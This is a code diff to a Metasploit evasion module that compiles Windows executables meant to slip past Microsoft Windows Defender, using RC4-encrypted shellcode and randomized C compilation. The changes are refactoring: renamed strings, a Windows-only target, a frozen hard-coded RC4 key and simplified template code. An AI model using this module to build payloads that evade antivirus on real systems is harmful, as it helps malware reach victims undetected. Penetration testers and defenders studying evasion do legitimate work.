@@ -9,7 +9,7 @@ class MetasploitModule < Msf::Evasion
 
   def initialize(info={})
     super(merge_info(info,
-      'Name'        => 'Microsoft Windows Defender Evasive EXE',
+      'Name'        => 'Microsoft Windows Defender Evasive Executable',
       'Description' => %q{
         This module allows you to generate a Windows EXE that evades against Microsoft
         Windows Defender. Multiple techniques such as shellcode encryption, source code
@@ -17,31 +17,23 @@ class MetasploitModule < Msf::Evasion
 
         For best results, please try to use payloads that use a more secure channel
         such as HTTPS or RC4 in order to avoid the payload network traffic getting
-        caught by AV.
+        caught by antivirus better.
       },
       'Author'      => [ 'sinn3r' ],
       'License'     => MSF_LICENSE,
-      #'Platform'    => 'win',
-      #'Arch'        => ARCH_X86,
-      'Targets'     =>
-        [
-          [ 'Linux',   { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
-          [ 'Windows', { 'Arch' => ARCH_X86, 'Platform' => 'win' } ]
-        ]
+      'Platform'    => 'win',
+      'Arch'        => ARCH_X86,
+      'Targets'     => [ ['Microsoft Windows', {}] ]
     ))
   end
 
   def rc4_key
-    '4ASMkFslyhwXehNZw048cF1Vh1ACzyyA'
+    '4ASMkFslyhwXehNZw048cF1Vh1ACzyyA'.freeze
   end
 
   def get_payload
     @c_payload ||= lambda {
-      opts = {
-        format: 'rc4',
-        key: rc4_key
-      }
-
+      opts = { format: 'rc4', key: rc4_key }
       p = payload
 
       return {
@@ -52,8 +44,7 @@ class MetasploitModule < Msf::Evasion
   end
 
   def c_template
-    @c_template ||= lambda {
-      %Q|#include <Windows.h>
+    @c_template ||= %Q|#include <Windows.h>
 #include <rc4.h>
 
 #{get_payload[:c_format]}
@@ -73,17 +64,13 @@ int main() {
 
   return 0;
 }|
-    }.call
   end
 
   def run
-    puts target.inspect
-
-    #puts c_template
+    vprint_line c_template
     bin = Metasploit::Framework::Compiler::Windows.compile_random_c(c_template)
-    print_status("Compiled binary size: #{bin.length}")
+    print_status("Compiled executable size: #{bin.length}")
     file_create(bin)
-
   end
 
 end
